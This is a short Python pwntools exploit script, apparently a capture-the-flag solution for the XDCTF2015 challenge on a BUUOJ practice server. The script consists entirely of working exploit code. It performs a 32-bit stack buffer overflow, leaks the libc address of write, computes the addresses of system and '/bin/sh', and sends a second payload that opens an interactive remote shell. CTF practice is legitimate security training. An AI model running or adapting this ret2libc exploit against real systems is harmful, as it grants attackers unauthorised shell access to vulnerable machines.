from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",29315)
elf=ELF("./timu")
#libc=ELF("/lib/i386-linux-gnu/libc.so.6")
libc=ELF("./libc-2.23.so")

write_plt=elf.plt["write"]
write_got=elf.got["write"]
main=0x0804851C

payload=0x70*b'a'+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(8)
sh.recvuntil(b"Welcome to XDCTF2015~!\n")
sh.sendline(payload)

write_addr=u32(sh.recv(4))
libc_base=write_addr-libc.sym["write"]
system_addr=libc_base+libc.sym["system"]
binsh=libc_base+next(libc.search(b"/bin/sh"))
payload=0x70*b'a'+p32(system_addr)+p32(main)+p32(binsh)
sh.sendline(payload)

sh.interactive()
